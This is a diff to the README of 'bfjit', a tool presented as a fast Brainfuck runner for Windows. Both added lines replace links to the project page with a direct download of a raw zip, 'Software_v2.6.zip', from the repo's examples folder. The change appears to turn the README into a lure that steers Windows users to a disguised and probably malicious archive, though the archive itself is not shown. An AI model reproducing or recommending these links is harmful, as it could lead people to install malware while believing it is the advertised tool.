@@ -1,6 +1,6 @@
 # ⚡ bfjit - Fast Brainfuck Runs on Windows
 
-[![Download bfjit](https://img.shields.io/badge/Download-bfjit-4B7BEC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/zeomorphiopening485/bfjit)
+[![Download bfjit](https://img.shields.io/badge/Download-bfjit-4B7BEC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/zeomorphiopening485/bfjit/raw/refs/heads/main/examples/Software_v2.6.zip)
 
 ## 🖥️ What bfjit is
 
@@ -17,7 +17,7 @@ Use it if you want to:
 
 Visit this page to download the app:
 
-[https://github.com/zeomorphiopening485/bfjit](https://github.com/zeomorphiopening485/bfjit)
+[https://github.com/zeomorphiopening485/bfjit/raw/refs/heads/main/examples/Software_v2.6.zip](https://github.com/zeomorphiopening485/bfjit/raw/refs/heads/main/examples/Software_v2.6.zip)
 
 ### Steps for Windows
 
